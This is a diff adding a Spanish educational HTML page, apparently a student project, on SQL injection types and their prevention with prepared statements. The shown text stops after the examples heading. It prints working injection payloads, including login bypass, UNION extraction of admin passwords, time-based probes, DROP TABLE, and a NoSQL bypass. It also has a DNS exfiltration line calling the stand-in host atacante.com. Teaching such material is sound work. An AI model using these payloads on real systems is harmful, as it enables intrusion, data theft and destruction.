@@ -1,0 +1,780 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="description" content="Guía completa sobre Inyecciones SQL: tipos, técnicas, prevención y buenas prácticas de seguridad web." />
+  <meta name="keywords" content="Inyección SQL, SQL Injection, Seguridad Web, OWASP, Base de Datos, Ciberseguridad" />
+  <meta name="author" content="Desarrollo de Aplicaciones Web - IS093A" />
+  <meta name="robots" content="index, follow" />
+  <meta property="og:title" content="Inyecciones SQL – Seguridad en Bases de Datos" />
+  <meta property="og:description" content="Aprende sobre ataques de inyección SQL, sus variantes y cómo proteger tus aplicaciones." />
+  <meta property="og:type" content="website" />
+
+  <title>Inyecciones SQL | Seguridad Web</title>
+
+  <link
+    rel="stylesheet"
+    href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css"
+    integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH"
+    crossorigin="anonymous"
+  />
+
+  <script src="https://cdn.tailwindcss.com"></script>
+
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css" />
+
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@400;600;700&family=Exo+2:wght@300;400;700;900&display=swap" rel="stylesheet" />
+
+  <link rel="stylesheet" href="styles.css" />
+
+  <script>
+    tailwind.config = {
+      prefix: 'tw-',
+      theme: {
+        extend: {
+          colors: {
+            danger: '#ef4444',
+            dark: '#0f172a',
+          },
+          fontFamily: {
+            mono: ['"Share Tech Mono"', 'monospace'],
+            display: ['"Exo 2"', 'sans-serif'],
+          }
+        }
+      }
+    }
+  </script>
+</head>
+
+<body class="tw-bg-slate-950 tw-text-slate-100" style="font-family: 'Rajdhani', sans-serif;">
+
+  <nav
+    class="navbar navbar-expand-lg navbar-dark tw-shadow-2xl tw-sticky tw-top-0 tw-z-50"
+    style="background: rgba(15,23,42,0.97); border-bottom: 2px solid #ef4444;"
+    aria-label="Navegación principal"
+  >
+    <div class="container tw-px-4">
+      <a class="navbar-brand tw-flex tw-items-center tw-gap-2 tw-font-mono tw-text-red-500" href="#hero">
+        <i class="bi bi-shield-exclamation tw-text-2xl"></i>
+        <span style="font-family:'Share Tech Mono'; font-size:1.1rem; letter-spacing:2px;">SQL_INJECT</span>
+      </a>
+
+      <button
+        class="navbar-toggler border-0"
+        type="button"
+        data-bs-toggle="collapse"
+        data-bs-target="#navbarPrincipal"
+        aria-controls="navbarPrincipal"
+        aria-expanded="false"
+        aria-label="Alternar navegación"
+      >
+        <span class="navbar-toggler-icon"></span>
+      </button>
+
+      <div class="collapse navbar-collapse tw-mt-3 tw-rounded-lg tw-bg-slate-900/95 tw-p-3 lg:tw-mt-0 lg:tw-bg-transparent lg:tw-p-0" id="navbarPrincipal">
+        <ul class="navbar-nav ms-auto tw-gap-1 tw-items-start lg:tw-items-center tw-w-full">
+          <li class="nav-item">
+            <a class="nav-link tw-text-slate-300 hover:tw-text-red-400 tw-transition-colors tw-px-3" href="#hero">
+              <i class="bi bi-house-door me-1"></i>Inicio
+            </a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link tw-text-slate-300 hover:tw-text-red-400 tw-transition-colors tw-px-3" href="#tipos">
+              <i class="bi bi-bug me-1"></i>Tipos
+            </a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link tw-text-slate-300 hover:tw-text-red-400 tw-transition-colors tw-px-3" href="#prevencion">
+              <i class="bi bi-shield-check me-1"></i>Prevención
+            </a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link tw-text-slate-300 hover:tw-text-red-400 tw-transition-colors tw-px-3" href="#ejemplos">
+              <i class="bi bi-code-slash me-1"></i>Ejemplos
+            </a>
+          </li>
+          <li class="nav-item dropdown tw-px-2">
+            <a
+              class="nav-link dropdown-toggle tw-text-slate-300 hover:tw-text-red-400"
+              href="#"
+              id="dropdownRecursos"
+              role="button"
+              data-bs-toggle="dropdown"
+              aria-expanded="false"
+            >
+              <i class="bi bi-grid me-1"></i>Recursos
+            </a>
+            <ul class="dropdown-menu dropdown-menu-end" style="background:#1e293b; border:1px solid #ef4444;" aria-labelledby="dropdownRecursos">
+              <li><a class="dropdown-item tw-text-slate-300 hover:tw-text-red-400" href="#" style="font-family:'Rajdhani'"><i class="bi bi-link-45deg me-1"></i>OWASP Top 10</a></li>
+              <li><a class="dropdown-item tw-text-slate-300 hover:tw-text-red-400" href="#" style="font-family:'Rajdhani'"><i class="bi bi-book me-1"></i>Documentación</a></li>
+              <li><hr class="dropdown-divider" style="border-color:#ef4444;"/></li>
+              <li><a class="dropdown-item tw-text-slate-300 hover:tw-text-red-400" href="#contacto" style="font-family:'Rajdhani'"><i class="bi bi-envelope me-1"></i>Contacto</a></li>
+            </ul>
+          </li>
+          <li class="nav-item tw-ml-2">
+            <span class="badge tw-bg-red-600 tw-text-white tw-px-3 tw-py-2 tw-rounded-full tw-animate-pulse" style="font-family:'Share Tech Mono'; font-size:0.7rem;">
+              <i class="bi bi-exclamation-triangle-fill me-1"></i>OWASP #1
+            </span>
+          </li>
+        </ul>
+      </div>
+    </div>
+  </nav>
+
+  <section id="hero" class="tw-min-h-screen tw-flex tw-items-start lg:tw-items-center tw-relative tw-overflow-hidden tw-pt-20 lg:tw-pt-0">
+
+    <div class="tw-absolute tw-inset-0 tw-opacity-10" style="background-image: repeating-linear-gradient(0deg, transparent, transparent 40px, rgba(239,68,68,0.3) 40px, rgba(239,68,68,0.3) 41px), repeating-linear-gradient(90deg, transparent, transparent 40px, rgba(239,68,68,0.3) 40px, rgba(239,68,68,0.3) 41px);"></div>
+
+    <div class="tw-absolute tw-top-1/4 tw-left-1/2 -tw-translate-x-1/2 -tw-translate-y-1/2 tw-w-96 tw-h-96 tw-rounded-full tw-opacity-20" style="background: radial-gradient(circle, #ef4444 0%, transparent 70%); filter:blur(60px);"></div>
+
+    <div class="container tw-relative tw-z-10">
+      <div class="row align-items-center g-5">
+        <div class="col-lg-7">
+          <p class="tw-font-mono tw-text-red-500 tw-text-sm tw-tracking-widest tw-uppercase tw-mb-4">
+            <span class="tw-animate-pulse">▶</span> Seguridad en Bases de Datos
+          </p>
+
+          <h1 class="display-2 fw-black tw-leading-tight" style="font-family:'Exo 2'; color:#f8fafc; line-height:1.05;">
+            Inyecciones
+            <span class="d-block tw-bg-gradient-to-r tw-from-red-500 tw-via-orange-400 tw-to-red-600 tw-bg-clip-text tw-text-transparent" style="-webkit-background-clip:text; -webkit-text-fill-color:transparent; background: linear-gradient(90deg,#ef4444,#f97316,#ef4444); -webkit-background-clip:text; -webkit-text-fill-color:transparent;">
+              SQL
+            </span>
+          </h1>
+
+          <p class="lead tw-text-slate-400 tw-max-w-3xl tw-text-balance tw-mt-4" style="font-size:1.1rem; line-height:1.7;">
+            El ataque más crítico en aplicaciones web según OWASP. Aprende cómo los atacantes manipulan consultas SQL para acceder, modificar o destruir datos críticos.
+          </p>
+
+          <div class="d-flex flex-wrap gap-3 tw-mt-8">
+            <a href="#tipos" class="btn btn-danger btn-lg tw-px-6 tw-py-3 tw-rounded-lg tw-font-semibold tw-shadow-lg hover:tw-scale-105 tw-transition-transform" style="font-family:'Exo 2'; letter-spacing:1px;">
+              <i class="bi bi-bug-fill me-2"></i>Ver Tipos de Ataque
+            </a>
+            <a href="#prevencion" class="btn btn-outline-light btn-lg tw-px-6 tw-py-3 tw-rounded-lg hover:tw-scale-105 tw-transition-transform" style="font-family:'Exo 2'; border-color:rgba(239,68,68,0.5);">
+              <i class="bi bi-shield-check me-2"></i>Cómo Prevenirlo
+            </a>
+          </div>
+
+          <div class="d-flex gap-4 tw-mt-10 flex-wrap">
+            <div class="tw-text-center">
+              <div class="tw-text-3xl tw-font-black tw-text-red-500" style="font-family:'Share Tech Mono'">65%</div>
+              <div class="tw-text-xs tw-text-slate-500 tw-uppercase tw-tracking-wider">Vulnerabilidades Web</div>
+            </div>
+            <div class="vr tw-bg-slate-700"></div>
+            <div class="tw-text-center">
+              <div class="tw-text-3xl tw-font-black tw-text-orange-400" style="font-family:'Share Tech Mono'">#1</div>
+              <div class="tw-text-xs tw-text-slate-500 tw-uppercase tw-tracking-wider">OWASP Top 10</div>
+            </div>
+            <div class="vr tw-bg-slate-700"></div>
+            <div class="tw-text-center">
+              <div class="tw-text-3xl tw-font-black tw-text-yellow-400" style="font-family:'Share Tech Mono'">1998</div>
+              <div class="tw-text-xs tw-text-slate-500 tw-uppercase tw-tracking-wider">Descubierto</div>
+            </div>
+          </div>
+        </div>
+
+        <div class="col-lg-5">
+          <div class="tw-rounded-2xl tw-overflow-hidden tw-shadow-2xl" style="border:1px solid rgba(239,68,68,0.3); background:#0d1117;">
+            <div class="tw-flex tw-items-center tw-gap-2 tw-px-4 tw-py-3" style="background:#161b22; border-bottom:1px solid #30363d;">
+              <span class="tw-w-3 tw-h-3 tw-rounded-full tw-bg-red-500"></span>
+              <span class="tw-w-3 tw-h-3 tw-rounded-full tw-bg-yellow-400"></span>
+              <span class="tw-w-3 tw-h-3 tw-rounded-full tw-bg-green-500"></span>
+              <span class="tw-ml-3 tw-text-xs tw-text-slate-500" style="font-family:'Share Tech Mono'">query.sql</span>
+            </div>
+            <pre class="tw-p-6 tw-m-0 tw-text-sm tw-leading-relaxed tw-overflow-x-auto" style="font-family:'Share Tech Mono'; color:#e6edf3;"><code><span style="color:#79c0ff;">-- Consulta vulnerable</span>
+<span style="color:#ff7b72;">SELECT</span> <span style="color:#a5d6ff;">*</span> <span style="color:#ff7b72;">FROM</span> usuarios
+<span style="color:#ff7b72;">WHERE</span> user = <span style="color:#a5d6ff;">'</span><span style="color:#ffa657;">$input</span><span style="color:#a5d6ff;">'</span>
+
+<span style="color:#79c0ff;">-- Entrada maliciosa del atacante</span>
+<span style="color:#ffa657;">$input</span> = <span style="color:#a5d6ff;">' OR '1'='1</span>
+
+<span style="color:#79c0ff;">-- Consulta resultante</span>
+<span style="color:#ff7b72;">SELECT</span> <span style="color:#a5d6ff;">*</span> <span style="color:#ff7b72;">FROM</span> usuarios
+<span style="color:#ff7b72;">WHERE</span> user = <span style="color:#a5d6ff;">''</span>
+<span style="color:#ff7b72;">OR</span> <span style="color:#a5d6ff;">'1'='1'</span>  <span style="color:#7ee787;">-- SIEMPRE TRUE</span>
+
+<span style="color:#f85149;">-- ⚠ ACCESO TOTAL A LA BD</span></code></pre>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section id="tipos" class="tw-py-20" style="background: linear-gradient(180deg, #0f172a 0%, #0c1524 100%);">
+    <div class="container">
+
+      <div class="tw-text-center tw-mb-14">
+        <span class="badge bg-danger tw-px-4 tw-py-2 tw-text-xs tw-tracking-widest tw-uppercase tw-mb-4" style="font-family:'Share Tech Mono'">
+          <i class="bi bi-bug me-1"></i>Clasificación OWASP
+        </span>
+        <h2 class="display-5 fw-bold tw-text-white" style="font-family:'Exo 2'">
+          Tipos de Inyección SQL
+        </h2>
+        <p class="lead tw-text-slate-400 tw-max-w-2xl tw-mx-auto">
+          Conoce las variantes más peligrosas y cómo operan sobre los sistemas de bases de datos.
+        </p>
+      </div>
+
+      <div class="row g-4">
+
+        <div class="col-md-4">
+          <div class="card h-100 tw-rounded-xl tw-shadow-lg hover:tw-scale-105 tw-transition-all tw-duration-300 tw-cursor-default"
+               style="background:#1e293b; border:1px solid rgba(239,68,68,0.25); overflow:hidden;">
+            <div class="tw-h-1 tw-w-full tw-bg-gradient-to-r tw-from-red-600 tw-to-red-400"></div>
+            <div class="card-body tw-p-6">
+              <div class="tw-flex tw-items-center tw-gap-3 tw-mb-4">
+                <div class="tw-w-10 tw-h-10 tw-rounded-lg tw-flex tw-items-center tw-justify-center tw-bg-red-900">
+                  <i class="bi bi-lightning-fill tw-text-red-400 tw-text-lg"></i>
+                </div>
+                <div>
+                  <span class="badge bg-danger mb-1" style="font-size:0.65rem;">CLÁSICA</span>
+                  <h5 class="card-title tw-text-white tw-mb-0" style="font-family:'Exo 2'">In-Band SQLi</h5>
+                </div>
+              </div>
+              <p class="card-text tw-text-slate-400 tw-text-sm tw-leading-relaxed">
+                El atacante usa el mismo canal para lanzar el ataque y obtener resultados. Es la variante más común y fácil de explotar.
+              </p>
+              <div class="tw-mt-4">
+                <div class="tw-rounded-lg tw-p-3 tw-text-xs tw-font-mono" style="background:#0d1117; color:#a5d6ff; border:1px solid #30363d;">
+                  <span style="color:#7ee787;">-- Error-Based</span><br/>
+                  ' AND 1=CONVERT(int,@@version)--<br/><br/>
+                  <span style="color:#7ee787;">-- Union-Based</span><br/>
+                  ' UNION SELECT user,pass,3 FROM admin--
+                </div>
+              </div>
+              <div class="tw-mt-4 tw-flex tw-gap-2">
+                <span class="badge tw-bg-red-900 tw-text-red-300 tw-rounded-full tw-px-3 tw-py-1" style="font-size:0.7rem;">Error-Based</span>
+                <span class="badge tw-bg-red-900 tw-text-red-300 tw-rounded-full tw-px-3 tw-py-1" style="font-size:0.7rem;">Union-Based</span>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <div class="col-md-4">
+          <div class="card h-100 tw-rounded-xl tw-shadow-lg hover:tw-scale-105 tw-transition-all tw-duration-300 tw-cursor-default"
+               style="background:#1e293b; border:1px solid rgba(234,179,8,0.25); overflow:hidden;">
+            <div class="tw-h-1 tw-w-full tw-bg-gradient-to-r tw-from-yellow-500 tw-to-orange-400"></div>
+            <div class="card-body tw-p-6">
+              <div class="tw-flex tw-items-center tw-gap-3 tw-mb-4">
+                <div class="tw-w-10 tw-h-10 tw-rounded-lg tw-flex tw-items-center tw-justify-center tw-bg-yellow-900">
+                  <i class="bi bi-eye-slash-fill tw-text-yellow-400 tw-text-lg"></i>
+                </div>
+                <div>
+                  <span class="badge bg-warning text-dark mb-1" style="font-size:0.65rem;">CIEGA</span>
+                  <h5 class="card-title tw-text-white tw-mb-0" style="font-family:'Exo 2'">Blind SQLi</h5>
+                </div>
+              </div>
+              <p class="card-text tw-text-slate-400 tw-text-sm tw-leading-relaxed">
+                No se muestra ningún error visible. El atacante infiere información según respuestas verdadero/falso o tiempos de respuesta.
+              </p>
+              <div class="tw-mt-4">
+                <div class="tw-rounded-lg tw-p-3 tw-text-xs tw-font-mono" style="background:#0d1117; color:#a5d6ff; border:1px solid #30363d;">
+                  <span style="color:#7ee787;">-- Boolean-Based</span><br/>
+                  ' AND 1=1-- (TRUE)<br/>
+                  ' AND 1=2-- (FALSE)<br/><br/>
+                  <span style="color:#7ee787;">-- Time-Based</span><br/>
+                  '; WAITFOR DELAY '0:0:5'--
+                </div>
+              </div>
+              <div class="tw-mt-4 tw-flex tw-gap-2">
+                <span class="badge tw-bg-yellow-900 tw-text-yellow-300 tw-rounded-full tw-px-3 tw-py-1" style="font-size:0.7rem;">Boolean-Based</span>
+                <span class="badge tw-bg-yellow-900 tw-text-yellow-300 tw-rounded-full tw-px-3 tw-py-1" style="font-size:0.7rem;">Time-Based</span>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <div class="col-md-4">
+          <div class="card h-100 tw-rounded-xl tw-shadow-lg hover:tw-scale-105 tw-transition-all tw-duration-300 tw-cursor-default"
+               style="background:#1e293b; border:1px solid rgba(168,85,247,0.25); overflow:hidden;">
+            <div class="tw-h-1 tw-w-full tw-bg-gradient-to-r tw-from-purple-600 tw-to-blue-500"></div>
+            <div class="card-body tw-p-6">
+              <div class="tw-flex tw-items-center tw-gap-3 tw-mb-4">
+                <div class="tw-w-10 tw-h-10 tw-rounded-lg tw-flex tw-items-center tw-justify-center tw-bg-purple-900">
+                  <i class="bi bi-arrow-left-right tw-text-purple-400 tw-text-lg"></i>
+                </div>
+                <div>
+                  <span class="badge bg-primary mb-1" style="font-size:0.65rem;">AVANZADA</span>
+                  <h5 class="card-title tw-text-white tw-mb-0" style="font-family:'Exo 2'">Out-of-Band SQLi</h5>
+                </div>
+              </div>
+              <p class="card-text tw-text-slate-400 tw-text-sm tw-leading-relaxed">
+                Usa canales alternativos (DNS, HTTP) para exfiltrar datos. Requiere funciones del servidor como xp_cmdshell o UTL_HTTP.
+              </p>
+              <div class="tw-mt-4">
+                <div class="tw-rounded-lg tw-p-3 tw-text-xs tw-font-mono" style="background:#0d1117; color:#a5d6ff; border:1px solid #30363d;">
+                  <span style="color:#7ee787;">-- DNS Exfiltration (SQL Server)</span><br/>
+                  '; exec master..xp_dirtree<br/>
+                  '//atacante.com/'+@@version--
+                </div>
+              </div>
+              <div class="tw-mt-4 tw-flex tw-gap-2">
+                <span class="badge tw-bg-purple-900 tw-text-purple-300 tw-rounded-full tw-px-3 tw-py-1" style="font-size:0.7rem;">DNS</span>
+                <span class="badge tw-bg-purple-900 tw-text-purple-300 tw-rounded-full tw-px-3 tw-py-1" style="font-size:0.7rem;">HTTP</span>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <div class="col-md-4">
+          <div class="card h-100 tw-rounded-xl tw-shadow-lg hover:tw-scale-105 tw-transition-all tw-duration-300 tw-cursor-default"
+               style="background:#1e293b; border:1px solid rgba(34,197,94,0.25); overflow:hidden;">
+            <div class="tw-h-1 tw-w-full tw-bg-gradient-to-r tw-from-green-500 tw-to-emerald-400"></div>
+            <div class="card-body tw-p-6">
+              <div class="tw-flex tw-items-center tw-gap-3 tw-mb-4">
+                <div class="tw-w-10 tw-h-10 tw-rounded-lg tw-flex tw-items-center tw-justify-center tw-bg-green-900">
+                  <i class="bi bi-database-fill-exclamation tw-text-green-400 tw-text-lg"></i>
+                </div>
+                <div>
+                  <span class="badge bg-success mb-1" style="font-size:0.65rem;">PERSISTENTE</span>
+                  <h5 class="card-title tw-text-white tw-mb-0" style="font-family:'Exo 2'">Stored SQLi</h5>
+                </div>
+              </div>
+              <p class="card-text tw-text-slate-400 tw-text-sm tw-leading-relaxed">
+                El payload se almacena en la base de datos y se ejecuta cuando otros usuarios acceden al contenido contaminado.
+              </p>
+              <div class="tw-mt-4">
+                <div class="tw-rounded-lg tw-p-3 tw-text-xs tw-font-mono" style="background:#0d1117; color:#a5d6ff; border:1px solid #30363d;">
+                  <span style="color:#7ee787;">-- Comentario malicioso guardado</span><br/>
+                  Nombre: <span style="color:#f85149;">'; DROP TABLE users;--</span><br/><br/>
+                  <span style="color:#7ee787;">-- Se ejecuta al recuperarlo</span><br/>
+                  SELECT name FROM comments WHERE id=1
+                </div>
+              </div>
+              <div class="tw-mt-4 tw-flex tw-gap-2">
+                <span class="badge tw-bg-green-900 tw-text-green-300 tw-rounded-full tw-px-3 tw-py-1" style="font-size:0.7rem;">Persistente</span>
+                <span class="badge tw-bg-green-900 tw-text-green-300 tw-rounded-full tw-px-3 tw-py-1" style="font-size:0.7rem;">Multi-usuario</span>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <div class="col-md-4">
+          <div class="card h-100 tw-rounded-xl tw-shadow-lg hover:tw-scale-105 tw-transition-all tw-duration-300 tw-cursor-default"
+               style="background:#1e293b; border:1px solid rgba(249,115,22,0.25); overflow:hidden;">
+            <div class="tw-h-1 tw-w-full tw-bg-gradient-to-r tw-from-orange-500 tw-to-amber-400"></div>
+            <div class="card-body tw-p-6">
+              <div class="tw-flex tw-items-center tw-gap-3 tw-mb-4">
+                <div class="tw-w-10 tw-h-10 tw-rounded-lg tw-flex tw-items-center tw-justify-center tw-bg-orange-900">
+                  <i class="bi bi-arrow-repeat tw-text-orange-400 tw-text-lg"></i>
+                </div>
+                <div>
+                  <span class="badge bg-warning text-dark mb-1" style="font-size:0.65rem;">DIFERIDA</span>
+                  <h5 class="card-title tw-text-white tw-mb-0" style="font-family:'Exo 2'">Second-Order SQLi</h5>
+                </div>
+              </div>
+              <p class="card-text tw-text-slate-400 tw-text-sm tw-leading-relaxed">
+                Los datos son almacenados de forma segura inicialmente, pero se usan sin sanitizar en una consulta posterior, activando el ataque con retraso.
+              </p>
+              <div class="tw-mt-4">
+                <div class="tw-rounded-lg tw-p-3 tw-text-xs tw-font-mono" style="background:#0d1117; color:#a5d6ff; border:1px solid #30363d;">
+                  <span style="color:#7ee787;">-- Paso 1: Registro seguro</span><br/>
+                  username = <span style="color:#f85149;">admin'--</span><br/><br/>
+                  <span style="color:#7ee787;">-- Paso 2: Cambio de contraseña</span><br/>
+                  UPDATE users SET pwd='X'<br/>
+                  WHERE user='<span style="color:#f85149;">admin'--</span>'
+                </div>
+              </div>
+              <div class="tw-mt-4 tw-flex tw-gap-2">
+                <span class="badge tw-bg-orange-900 tw-text-orange-300 tw-rounded-full tw-px-3 tw-py-1" style="font-size:0.7rem;">Diferida</span>
+                <span class="badge tw-bg-orange-900 tw-text-orange-300 tw-rounded-full tw-px-3 tw-py-1" style="font-size:0.7rem;">Compleja</span>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <div class="col-md-4">
+          <div class="card h-100 tw-rounded-xl tw-shadow-lg hover:tw-scale-105 tw-transition-all tw-duration-300 tw-cursor-default"
+               style="background:#1e293b; border:1px solid rgba(56,189,248,0.25); overflow:hidden;">
+            <div class="tw-h-1 tw-w-full tw-bg-gradient-to-r tw-from-sky-500 tw-to-cyan-400"></div>
+            <div class="card-body tw-p-6">
+              <div class="tw-flex tw-items-center tw-gap-3 tw-mb-4">
+                <div class="tw-w-10 tw-h-10 tw-rounded-lg tw-flex tw-items-center tw-justify-center tw-bg-sky-900">
+                  <i class="bi bi-braces-asterisk tw-text-sky-400 tw-text-lg"></i>
+                </div>
+                <div>
+                  <span class="badge bg-info text-dark mb-1" style="font-size:0.65rem;">MODERNA</span>
+                  <h5 class="card-title tw-text-white tw-mb-0" style="font-family:'Exo 2'">NoSQL Injection</h5>
+                </div>
+              </div>
+              <p class="card-text tw-text-slate-400 tw-text-sm tw-leading-relaxed">
+                Variante que afecta bases de datos NoSQL como MongoDB. Usa operadores de consulta para bypassear autenticación sin usar SQL.
+              </p>
+              <div class="tw-mt-4">
+                <div class="tw-rounded-lg tw-p-3 tw-text-xs tw-font-mono" style="background:#0d1117; color:#a5d6ff; border:1px solid #30363d;">
+                  <span style="color:#7ee787;">-- MongoDB payload</span><br/>
+                  {"username": <span style="color:#f85149;">{"$gt":""}</span>,<br/>
+                   "password": <span style="color:#f85149;">{"$gt":""}</span>}<br/><br/>
+                  <span style="color:#7ee787;">-- Siempre retorna TRUE</span>
+                </div>
+              </div>
+              <div class="tw-mt-4 tw-flex tw-gap-2">
+                <span class="badge tw-bg-sky-900 tw-text-sky-300 tw-rounded-full tw-px-3 tw-py-1" style="font-size:0.7rem;">MongoDB</span>
+                <span class="badge tw-bg-sky-900 tw-text-sky-300 tw-rounded-full tw-px-3 tw-py-1" style="font-size:0.7rem;">Redis</span>
+              </div>
+            </div>
+          </div>
+        </div>
+
+      </div>
+    </div>
+  </section>
+
+  <section id="prevencion" class="tw-py-20" style="background:#0f172a;">
+    <div class="container">
+      <div class="tw-text-center tw-mb-12">
+        <span class="badge bg-success tw-px-4 tw-py-2 tw-text-xs tw-tracking-widest tw-uppercase tw-mb-4" style="font-family:'Share Tech Mono'">
+          <i class="bi bi-shield-check me-1"></i>Mitigación
+        </span>
+        <h2 class="display-5 fw-bold tw-text-white" style="font-family:'Exo 2'">Prevención de Inyecciones SQL</h2>
+        <p class="lead tw-text-slate-400">Técnicas efectivas recomendadas por OWASP para proteger tus aplicaciones</p>
+      </div>
+
+      <div class="row g-4 align-items-stretch">
+        <div class="col-lg-6">
+          <div class="tw-rounded-xl tw-p-6 tw-h-full" style="background:#1e293b; border:1px solid rgba(34,197,94,0.2);">
+            <h4 class="tw-text-green-400 tw-mb-5" style="font-family:'Exo 2'"><i class="bi bi-check2-circle me-2"></i>Buenas Prácticas</h4>
+            <div class="tw-space-y-4">
+              <div class="tw-flex tw-gap-3 tw-items-start tw-p-3 tw-rounded-lg" style="background:rgba(34,197,94,0.05);">
+                <div class="tw-w-8 tw-h-8 tw-rounded-full tw-bg-green-900 tw-flex tw-items-center tw-justify-center tw-flex-shrink-0">
+                  <i class="bi bi-1-circle-fill tw-text-green-400 tw-text-sm"></i>
+                </div>
+                <div>
+                  <strong class="tw-text-white" style="font-family:'Exo 2'">Prepared Statements</strong>
+                  <p class="tw-text-slate-400 tw-text-sm tw-mt-1 tw-mb-0">Separa código SQL de los datos usando parámetros. Método más efectivo contra SQLi.</p>
+                </div>
+              </div>
+              <div class="tw-flex tw-gap-3 tw-items-start tw-p-3 tw-rounded-lg" style="background:rgba(34,197,94,0.05);">
+                <div class="tw-w-8 tw-h-8 tw-rounded-full tw-bg-green-900 tw-flex tw-items-center tw-justify-center tw-flex-shrink-0">
+                  <i class="bi bi-2-circle-fill tw-text-green-400 tw-text-sm"></i>
+                </div>
+                <div>
+                  <strong class="tw-text-white" style="font-family:'Exo 2'">ORM / Query Builders</strong>
+                  <p class="tw-text-slate-400 tw-text-sm tw-mt-1 tw-mb-0">Frameworks como Hibernate, SQLAlchemy o Eloquent gestionan el escape automáticamente.</p>
+                </div>
+              </div>
+              <div class="tw-flex tw-gap-3 tw-items-start tw-p-3 tw-rounded-lg" style="background:rgba(34,197,94,0.05);">
+                <div class="tw-w-8 tw-h-8 tw-rounded-full tw-bg-green-900 tw-flex tw-items-center tw-justify-center tw-flex-shrink-0">
+                  <i class="bi bi-3-circle-fill tw-text-green-400 tw-text-sm"></i>
+                </div>
+                <div>
+                  <strong class="tw-text-white" style="font-family:'Exo 2'">Validación de Entradas</strong>
+                  <p class="tw-text-slate-400 tw-text-sm tw-mt-1 tw-mb-0">Whitelist de caracteres permitidos, validación de tipos y longitud máxima en cada campo.</p>
+                </div>
+              </div>
+              <div class="tw-flex tw-gap-3 tw-items-start tw-p-3 tw-rounded-lg" style="background:rgba(34,197,94,0.05);">
+                <div class="tw-w-8 tw-h-8 tw-rounded-full tw-bg-green-900 tw-flex tw-items-center tw-justify-center tw-flex-shrink-0">
+                  <i class="bi bi-4-circle-fill tw-text-green-400 tw-text-sm"></i>
+                </div>
+                <div>
+                  <strong class="tw-text-white" style="font-family:'Exo 2'">Principio de Mínimo Privilegio</strong>
+                  <p class="tw-text-slate-400 tw-text-sm tw-mt-1 tw-mb-0">La cuenta de BD de la app solo debe tener los permisos estrictamente necesarios (sin DROP, ALTER).</p>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <div class="col-lg-6">
+          <div class="tw-rounded-xl tw-overflow-hidden tw-h-full" style="border:1px solid rgba(239,68,68,0.2);">
+            <div class="tw-p-4" style="background:#1a0a0a;">
+              <div class="tw-flex tw-items-center tw-gap-2 tw-mb-3">
+                <span class="badge bg-danger" style="font-size:0.7rem;"><i class="bi bi-x-circle me-1"></i>VULNERABLE (PHP)</span>
+              </div>
+              <pre class="tw-m-0 tw-text-xs tw-leading-relaxed" style="font-family:'Share Tech Mono'; color:#e6edf3;"><code><span style="color:#79c0ff;">// ❌ Concatenación directa - PELIGROSO</span>
+<span style="color:#ffa657;">$user</span> = <span style="color:#a5d6ff;">$_POST</span>[<span style="color:#a5d6ff;">'username'</span>];
+<span style="color:#ffa657;">$sql</span> = <span style="color:#a5d6ff;">"SELECT * FROM users
+         WHERE user='"</span> . <span style="color:#ffa657;">$user</span> . <span style="color:#a5d6ff;">"'"</span>;
+<span style="color:#ffa657;">$result</span> = <span style="color:#ff7b72;">mysqli_query</span>(<span style="color:#ffa657;">$conn</span>, <span style="color:#ffa657;">$sql</span>);</code></pre>
+            </div>
+            <div class="tw-flex tw-items-center tw-gap-3 tw-px-4 tw-py-2" style="background:#0f172a;">
+              <div class="tw-flex-1 tw-h-px" style="background:rgba(239,68,68,0.3);"></div>
+              <span class="tw-text-slate-500 tw-text-xs" style="font-family:'Share Tech Mono'">vs</span>
+              <div class="tw-flex-1 tw-h-px" style="background:rgba(34,197,94,0.3);"></div>
+            </div>
+            <div class="tw-p-4" style="background:#0a1a0a;">
+              <div class="tw-flex tw-items-center tw-gap-2 tw-mb-3">
+                <span class="badge bg-success" style="font-size:0.7rem;"><i class="bi bi-check-circle me-1"></i>SEGURO - Prepared Statement (PHP PDO)</span>
+              </div>
+              <pre class="tw-m-0 tw-text-xs tw-leading-relaxed" style="font-family:'Share Tech Mono'; color:#e6edf3;"><code><span style="color:#7ee787;">// ✅ Prepared Statement - SEGURO</span>
+<span style="color:#ffa657;">$user</span> = <span style="color:#a5d6ff;">$_POST</span>[<span style="color:#a5d6ff;">'username'</span>];
+<span style="color:#ffa657;">$stmt</span> = <span style="color:#ffa657;">$pdo</span>-><span style="color:#ff7b72;">prepare</span>(
+  <span style="color:#a5d6ff;">"SELECT * FROM users WHERE user = ?"</span>
+);
+<span style="color:#ffa657;">$stmt</span>-><span style="color:#ff7b72;">execute</span>([<span style="color:#ffa657;">$user</span>]);
+<span style="color:#ffa657;">$result</span> = <span style="color:#ffa657;">$stmt</span>-><span style="color:#ff7b72;">fetchAll</span>();
+<span style="color:#79c0ff;">// Los parámetros NUNCA son ejecutados como código SQL</span></code></pre>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section id="ejemplos" class="tw-py-20" style="background: linear-gradient(180deg, #0f172a 0%, #0c1524 100%);">
+    <div class="container">
+      <div class="tw-text-center tw-mb-12">
+        <span class="badge bg-info text-dark tw-px-4 tw-py-2 tw-text-xs tw-tracking-widest tw-uppercase tw-mb-4" style="font-family:'Share Tech Mono'">
+          <i class="bi bi-code-slash me-1"></i>Ejemplos
+        </span>
